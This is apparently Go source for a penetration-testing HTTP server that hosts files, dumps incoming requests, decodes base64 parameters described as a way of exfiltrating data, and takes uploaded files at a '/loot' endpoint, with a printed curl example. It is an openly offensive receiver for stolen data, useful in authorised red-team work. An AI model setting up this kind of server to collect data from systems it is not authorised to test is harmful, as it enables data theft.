package goserver

import (
	"bytes"
	"encoding/base64"
	"fmt"
	"io/ioutil"
	"log"
	"net"
	"net/http"
	"net/url"
	"strings"
)

const (
	Reset  = "\033[0m"
	Red    = "\033[31m"
	Green  = "\033[32m"
	Yellow = "\033[33m"
	Blue   = "\033[34m"
	Purple = "\033[35m"
	Cyan   = "\033[36m"
	Gray   = "\033[37m"
	White  = "\033[97m"
)

var Dump bool
var WorkDir string
var DoAuth bool
var Username string
var Password string
var RedirectURL string
var Addr string
var Port string
var SSL bool
var SSLCert string
var SSLKey string
var Headers map[string]string

func CheckAuth(r *http.Request) bool {
	if !DoAuth {
		return true
	}

	u, p, ok := r.BasicAuth()
	if !ok {
		return false
	}
	if u != Username {
		return false
	}
	if p != Password {
		return false
	}
	return true
}

func DropLoot(w http.ResponseWriter, r *http.Request) {
	auth := CheckAuth(r)
	DumpReq(w, r, auth)
	if !auth {
		return
	}

	r.ParseMultipartForm(10 << 20)

	file, handler, err := r.FormFile("file")
	if err != nil {
		fmt.Println(Red+"[ERROR] Retrieving the File", Reset)
		fmt.Println(err)
		return
	}
	defer file.Close()

	fileBytes, err := ioutil.ReadAll(file)
	if err != nil {
		fmt.Println(err)
	}

	err = ioutil.WriteFile(WorkDir+"/"+handler.Filename, fileBytes, 0644)
	if err != nil {
		fmt.Println(Red+"[ERROR] Failed to write local file:", WorkDir+"/"+handler.Filename, Reset)
		return
	}
	fmt.Println(Green+"[+] Uploaded File:", handler.Filename, Reset)
}

func DumpReq(w http.ResponseWriter, req *http.Request, auth bool) {
	authmsg := ""
	if DoAuth {
		if auth {
			authmsg = Green + "(Auth Valid)" + Reset
		} else {
			authmsg = Red + "(Auth Failed)" + Reset
		}

	}
	log.Println(req.Method, "from", req.RemoteAddr+":", req.URL.Path, authmsg)
	if Dump {
		qp := ""
		query := parseParams(req.URL.RawQuery)

		if len(req.URL.RawQuery) > 0 {
			qp = "?" + query
		}

		// fmt.Println(req.Method + " " + req.URL.Path + qp + " " + req.Proto)

		body, err := ioutil.ReadAll(req.Body)

		if err != nil {
			log.Println(Red+"[ERROR] reading body:", err, Reset)
			return
		}

		// fmt.Println()
		// fmt.Println()

		fmt.Println(Cyan + "-------------------------------------- Request --------------------------------------")

		fmt.Println(req.Method + " " + req.URL.Path + qp + " " + req.Proto)
		fmt.Println("Host: " + req.Host)
		for k := range req.Header {
			fmt.Println(k + ": " + req.Header.Get(k))
		}
		fmt.Printf("\n\n")
		tmpBody := parseParams(string(body))

		fmt.Println(tmpBody)
		req.Body.Close() //  must close
		req.Body = ioutil.NopCloser(bytes.NewBuffer(body))
		fmt.Println("-------------------------------------------------------------------------------------", Reset)

	}

}

// parseParams handles "special" GET/POST params like base64, for exfilling encoded data
func parseParams(data string) string {
	parts := strings.Split(data, "&")
	if len(parts) > 0 {
		for _, set := range parts {
			setparts := strings.SplitN(set, "=", 2)
			if setparts[0] == "base64" {
				decodeddata := urlDecode(setparts[1])
				data = strings.Replace(data, setparts[1], b64Decode(decodeddata), 1)
			}
		}
	}
	return data
}

func urlDecode(encodedValue string) string {
	var err error
	decodedValue := encodedValue

	decodedValue, err = url.QueryUnescape(encodedValue)
	if err != nil {
		return encodedValue
	}
	return decodedValue
}
func b64Decode(encodedValue string) string {
	data, err := base64.StdEncoding.DecodeString(encodedValue)
	if err != nil {
		return encodedValue
	}
	return string(data)
}

func ServeFiles(h http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		auth := CheckAuth(r)
		DumpReq(w, r, auth)
		if !auth {
			return
		}
		for k, v := range Headers {
			w.Header().Add(k, v)
		}

		h.ServeHTTP(w, r) // call original

	})
}

func ListURLs(addr, port string, ssl bool) {
	scheme := "http"
	if ssl {
		scheme = "https"
	}
	fmt.Println(Blue+"[!] Starting web server at:", Reset)
	if addr != "" {
		fmt.Println(Yellow+"     "+scheme+"://"+addr+":"+port, Reset)
	} else {
		ip, err := net.InterfaceAddrs()
		if err == nil {
			for _, v := range ip {
				fmt.Println(Yellow+"     "+scheme+"://"+strings.Split(v.String(), "/")[0]+":"+port, Reset)

			}
		}
	}
	fmt.Println()
}

func Redir(w http.ResponseWriter, r *http.Request) {
	auth := CheckAuth(r)
	DumpReq(w, r, auth)
	http.Redirect(w, r, RedirectURL, http.StatusSeeOther)
}

func Run() {
	if SSL {
		if SSLCert == "" || SSLKey == "" {
			fmt.Println(Green+"[+] Generating a New certificate (will be self signed !!)...", Reset)
			_, _, err := LoadOrCreateCA("/tmp/key", "/tmp/cert")
			if err != nil {
				log.Fatal("could not create/load CA key pair: %w", err)
			}
			SSLCert = "/tmp/cert"
			SSLKey = "/tmp/key"
		}
	}

	fmt.Println(Blue + "[!] Upload URI: /loot (curl -F \"file=@./file.txt\" http[s]://address:port/loot)" + Reset)
	fmt.Println(Blue + "[!] Special Params: base64 (GET/POST)" + Reset)
	fmt.Println(Blue+"[!] Dump Requests:", Dump, Reset)
	fmt.Println(Blue+"[!] Auth Enabled:", DoAuth, Reset)
	fmt.Println(Blue+"[!] Working Directory:", WorkDir, Reset)
	fmt.Println(Blue+"[!] SSL Enabled:", SSL, Reset)
	ListURLs(Addr, Port, SSL)
	http.HandleFunc("/loot", DropLoot)
	if RedirectURL == "" {
		http.Handle("/", ServeFiles(http.FileServer(http.Dir(WorkDir))))
	} else {
		http.HandleFunc("/", Redir)
	}
	if SSL {
		err := http.ListenAndServeTLS(Addr+":"+Port, SSLCert, SSLKey, nil)
		if err != nil {
			log.Fatal("ListenAndServeTLS: ", err)
		}
	} else {
		err := http.ListenAndServe(Addr+":"+Port, nil)
		if err != nil {
			log.Fatal("ListenAndServe: ", err)
		}
	}
}
